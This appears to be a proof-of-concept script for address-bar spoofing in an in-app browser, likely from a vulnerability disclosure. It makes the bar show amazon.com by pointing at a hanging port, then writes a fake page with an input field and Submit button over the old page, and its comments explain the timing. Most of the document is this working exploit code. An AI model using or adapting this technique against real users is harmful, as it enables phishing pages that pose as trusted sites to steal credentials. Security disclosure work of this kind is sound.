<script>
// Shown while the bar is stuck on amazon.com (connection to :4444 hangs → amazon never loads)
var POC = '<!doctype html><html><head><meta charset="utf-8">'
  + '<meta name="viewport" content="width=device-width, initial-scale=1"><title>amazon.com</title></head>'
  + '<body><h1>Ini Bukan Asli</h1>'
  + 'Spoof here <input type="text"> <button onclick="return false">Submit</button>'
  + '</body></html>';

function inject(){
  try { window.stop(); } catch(e){}
  try { document.open(); document.write(POC); document.close(); } catch(e){}
}

function go(){
  // Anchor navigates to amazon.com on a filtered port → the IAB updates the bar to amazon.com
  // (optimistic), the connection hangs so amazon never renders, and the old page stays alive.
  // With no load to race, we inject after the bar has flipped. Bump the delay if your bar is slow.
  setTimeout(inject, 1200);
  return true;
}
</script>
